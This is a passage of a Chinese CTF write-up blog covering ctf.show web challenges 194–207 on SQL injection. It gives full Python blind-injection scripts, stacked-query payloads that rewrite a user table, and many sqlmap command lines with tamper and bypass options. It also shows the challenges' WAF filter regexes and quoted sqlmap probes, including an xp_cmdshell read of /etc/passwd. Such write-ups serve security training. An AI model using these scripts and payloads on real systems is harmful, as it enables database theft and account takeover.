<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">"' or (select length(group_concat(column_name)) from information_schema.columns where table_name='%s')=%d#"</span><span class="token operator">%</span><span class="token punctuation">(</span>tb_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span>
    data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
    <span class="token comment">#print(data)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        all_column_len <span class="token operator">=</span> x
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]All listed lengths are : %d"</span><span class="token operator">%</span><span class="token punctuation">(</span>all_column_len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>all_column_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'1234567890abcdefghijklmnopqrstuvwxyz-_,'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"'or (select mid(group_concat(column_name),%d,1) from information_schema.columns where table_name='%s')='%c'#"</span><span class="token operator">%</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>tb_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            column_name <span class="token operator">+=</span> y
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]The column name in the %s table is %s"</span><span class="token operator">%</span><span class="token punctuation">(</span>tb_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGetting the flag......"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"'or (select mid(group_concat(f1ag),%d,1) from %s)='%c'#"</span><span class="token operator">%</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>tb_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> y
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The flag is %s"</span><span class="token operator">%</span> flag<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> <span class="token string">'}'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大佬笑笑就好，嘿嘿</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding: utf-8</span>
<span class="token comment"># @Author:  yq1ng</span>
<span class="token comment"># @Date:    2020-11-17 17:30</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://c7a0f777-8dd9-4fa8-a5fd-8f704d8078dc.chall.ctf.show/api/'</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">}</span>

tb_name <span class="token operator">=</span> <span class="token string">''</span>
all_column_len<span class="token operator">=</span><span class="token number">0</span>
column_name <span class="token operator">=</span> <span class="token string">''</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token comment">#table_name</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGetting the table name..."</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 不晓得有多少，尽量大喽，当然，while true也行</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'ctfshow_abdegijklmnopqruvxyz-,0123456789!'</span><span class="token punctuation">:</span><span class="token comment"># 根据命名规则，表名是不会有！的，所以嘿嘿</span>
        payload <span class="token operator">=</span> <span class="token string">"'or (select mid(group_concat(table_name),%d,1) from information_schema.tables where table_schema=database())='%c'#"</span><span class="token operator">%</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            tb_name <span class="token operator">+=</span> y
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]table name is %s"</span><span class="token operator">%</span> tb_name<span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> y<span class="token operator">==</span><span class="token string">"!"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\nDone!The table names in this database are："</span><span class="token punctuation">,</span>tb_name<span class="token punctuation">)</span>

guess_tbName <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\nPlease enter the name of the table you want to guess: "</span><span class="token punctuation">)</span>
<span class="token comment">#column_name</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGuess the column names in the %s table......"</span><span class="token operator">%</span> guess_tbName<span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">"' or (select length(group_concat(column_name)) from information_schema.columns where table_name='%s')=%d#"</span><span class="token operator">%</span><span class="token punctuation">(</span>guess_tbName<span class="token punctuation">,</span>x<span class="token punctuation">)</span>
    data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
    <span class="token comment">#print(data)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        all_column_len <span class="token operator">=</span> x
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]All listed lengths are : %d"</span><span class="token operator">%</span><span class="token punctuation">(</span>all_column_len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>all_column_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'1234567890abcdefghijklmnopqrstuvwxyz-_,'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"'or (select mid(group_concat(column_name),%d,1) from information_schema.columns where table_name='%s')='%c'#"</span><span class="token operator">%</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>guess_tbName<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            column_name <span class="token operator">+=</span> y
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The column name in the %s table is %s"</span><span class="token operator">%</span><span class="token punctuation">(</span>guess_tbName<span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>

guess_flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n\nOkay, we're getting a flag. Tell me the list:"</span><span class="token punctuation">)</span>
<span class="token comment">#flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGetting the flag......"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"'or (select mid(group_concat(%s),%d,1) from %s)='%c'#"</span><span class="token operator">%</span><span class="token punctuation">(</span>guess_flag<span class="token punctuation">,</span>x<span class="token punctuation">,</span>guess_tbName<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> y
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The flag is %s"</span><span class="token operator">%</span> flag<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> <span class="token string">'}'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>sql:<code>$sql = "select pass from ctfshow_user where username = {$username};";</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//waf</span>
<span class="token comment">//密码检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'密码只能为数字'</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//密码判断</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'登陆成功'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'用户名非法'</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token double-quoted-string string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这题记录的有点迷了，师傅们仅作参考，搞不懂当时咋想的了，应该直接更密码就可以了<br>开始用的<code>admin;update`ctfshow_user`set`pass`=1;</code>，一直不对，想了想，字符串需要引号啊，引号又被ban了，所以改用户名为数字就好<br>payload:<code>1;update`ctfshow_user`set`username`=1;</code> <code>password=1</code>，不能登录的话就把pass也更新为1<code>1;update`ctfshow_user`set`pass`=1;</code></p>
<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>sql: <code>  $sql = "select pass from ctfshow_user where username = {$username};";</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">waf<span class="token punctuation">:</span>
  <span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'用户名非法'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'用户名不能超过16个字符'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token double-quoted-string string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这题略坑，说是过滤<code>select</code>但是没过滤，直接<code>1;select(1)</code> pass: <code>1</code>过了<br>用户名没有为1的，所以返回的结果集是后面的，不用纠结<code>$row[0]==$password</code></p>
<h2 id="web197-200"><a href="#web197-200" class="headerlink" title="web197 - 200"></a>web197 - 200</h2><p>拼接sql：<code>$sql = "select pass from ctfshow_user where username = {$username};";</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//waf</span>
<span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'用户名非法'</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token double-quoted-string string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通杀非预期（骚气阿狸大佬的思路）：username:<code>1;show tables;</code>，pass:<code>ctfshow_user</code>，能做到这应该也懂原理</p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p><del>玩会sqlmap，189往后先搁置了哈哈哈哈，系列题目，直接dump了</del><br><code>py2 .\sqlmap.py -u http://3b960f3f-27df-4014-a22f-e075453fe298.chall.ctf.show/api/index.php?id=1 --referer=ctf.show  --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump --headers="Content-Type: text/plain"</code></p>
<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><blockquote>
<p>–method=* 调整请求方式</p>
</blockquote>
<p><code> py2 .\sqlmap.py -u "http://695acb0a-fd61-42e7-866b-1ffa3b15f5e0.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump</code></p>
<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p>hint：cookie<br><code>py2 .\sqlmap.py -u "http://d992d54c-ff57-4d7f-9667-b6f96906eadc.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --cookie="*your cookie*" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump</code></p>
<h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><blockquote>
<p>api调用需要鉴权</p>
</blockquote>
<p>在<code>URL/js/select.js</code>发现<code>api/getToken.php</code>，sqlmap在此鉴权，本次库、表、字都有所改变\</p>
<blockquote>
<p><code>--batch</code> –&gt; 静默选项，sqlmap自动确认<br><code>--safe-url=SAFEURL</code> –&gt; 设置在测试目标地址前访问的安全链接<br><code>--safe-freq=SAFE..</code> –&gt; 设置两次注入测试前访问安全链接的次数</p>
</blockquote>
<p>爆库：<code>py2 .\sqlmap.py -u "http://5d767ccc-4f5b-4671-906a-ae6e7e2e483b.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://5d767ccc-4f5b-4671-906a-ae6e7e2e483b.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --dbs --batch</code><br>爆表：<code>前面相同  --dbms=mysql -D ctfshow_web --tables --batch</code><br>爆字段：<code>--dbms=mysql -D ctfshow_web -T ctfshow_flax --dump --batch</code></p>
<h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><blockquote>
<p>sql需要闭合<br><code>--prefix=PREFIX</code> –&gt; 攻击载荷的前缀<br><code>--suffix=SUFFIX</code> –&gt; 攻击载荷的后缀</p>
</blockquote>
<p>database:<code>py2 .\sqlmap.py -u "http://979152ce-ff3e-452d-80f1-e4723f247b66.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://979152ce-ff3e-452d-80f1-e4723f247b66.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --dbs --batch --prefix="')" --suffix="and ('y')=('y"</code><br>tables: <code>ctfshow_flaxc</code> and <code>ctfshow_user</code><br><code>--dbms=mysql -D ctfshow_web --tables --batch --prefix="')" --suffix="and ('y')=('y"</code><br>column: <code>--dbms=mysql -D ctfshow_web -T ctfshow_flaxc --dump --batch --prefix="')" --suffix="and ('y')=('y"</code><br>一开始没爆出来，出了这个</p>
<pre class="line-numbers language-none"><code class="language-none">+---------+---------+---------+
| id      | tes     | flagv   |
+---------+---------+---------+
| &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+---------+---------+---------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就加了<code>-C flagv</code>参数，got it<br>突然想知道sqlmap怎么爆破的，加上<code>--proxy=http://127.0.0.1:8080</code>，bp抓包看看</p>
<ol>
<li>先请求了鉴权页面<code>GET /api/getToken.php</code>,然后<code>PUT /api/index.php</code> <code>id=1</code></li>
<li>循环第一步，每次先鉴权再上payload</li>
<li>先用bool盲注试了一下，再用报错，最后时间盲注</li>
</ol>
<p>前面一堆看不懂的操作，从我看懂的开始（不懂的也谷歌不到）\</p>
<ul>
<li>进行xss？还用了目录穿越读文件。。不懂<br>  <code>7178 AND 1=1 UNION ALL SELECT 1,NULL,'&lt;script&gt;alert("XSS")&lt;/script&gt;',table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#</code></li>
<li>报错<br><code>1') AND (SELECT 5989 FROM(SELECT COUNT(*),CONCAT(0x716b626271,(SELECT (ELT(5989=5989,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)and ('y')=('y</code></li>
<li>时间盲注<br><code>1') AND SLEEP(5)and ('y')=('y</code></li>
<li>依次增加字段数<br><code>1') UNION ALL SELECT NULL,NULL,NULLand ('y')=('y</code></li>
<li>再次验证sleep<br><code>id=1') AND 8923=IF((49=49),SLEEP(5),8923)and ('y')=('y</code></li>
<li>判断表中记录<br><code>id=1') AND 4849=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM ctfshow_web.ctfshow_flaxc),1,1))&gt;49),SLEEP(5),4849)and ('y')=('y</code><br>再判断是否等于49：<code>!=49</code></li>
<li>开始判断内容了，似乎是二分法<br><code>id=1') AND 2696=IF((ORD(MID((SELECT IFNULL(CAST(flagv AS CHAR),0x20) FROM ctfshow_web.ctfshow_flaxc ORDER BY flagv LIMIT 0,1),1,1))&gt;151259),SLEEP(5),2696)and ('y')=('y</code><br>我能看懂的流程也就这么多，应该会有借鉴payload的时候，前面七七八八的pl真是不懂，response也没东西，不晓得sqlmap是在干嘛，但应该是有用的，有兴趣可以抓包搜一下pl</li>
</ul>
<h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><blockquote>
<p><code>--tamper</code> 的初体验<br>waf：<code>preg_match('/ /', $str)</code><br><code>--current-db</code> 检索当前使用的数据库名称<br><code>--threads=num</code> 线程</p>
</blockquote>
<p>要上攻击载荷了，就是编码一些字符，查看js还是有鉴权，waf过滤了空格，攻击载荷可以在<code>sqlmap\tamper</code>目录里面看到<br>时间盲注，直接爆当前数据库就好，不然等的心累<br>database: <code>py2 .\sqlmap.py -u "http://050a59e1-204c-45f2-9d4c-1856ee80a196.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://050a59e1-204c-45f2-9d4c-1856ee80a196.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --dump --batch --prefix="')" --suffix="and ('y')=('y" --tamper=space2comment</code><br>额，上面的直接给我把库和表都跑出来了，它还不尽兴，想一下把数据都跑出来，但是时间盲注太慢了，我只要flag就行</p>
<p>flag: <code>  -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</code>最后加了个<code>--threads=3</code>时间盲注太慢了，加了个线程</p>
<h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><blockquote>
